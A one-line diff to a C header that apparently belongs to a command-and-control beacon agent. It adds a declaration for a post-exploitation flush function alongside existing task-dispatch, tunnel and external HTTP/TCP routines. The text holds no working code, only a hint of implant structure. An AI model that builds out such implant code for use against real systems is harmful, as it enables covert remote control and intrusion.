@@ -16,6 +16,7 @@ VOID AgentDispatchTasks(BeaconContext* ctx, const ByteBuf* encrypted_tasks);
 VOID AgentFlushTransfers(BeaconContext* ctx);
 VOID AgentFlushTunnels(BeaconContext* ctx);
 VOID AgentFlushCascade(BeaconContext* ctx);
+VOID AgentFlushPostEx(BeaconContext* ctx);
 
 INT AgentRunExternalHttp(Agent* agent);
 INT AgentRunExternalTcp(Agent* agent);
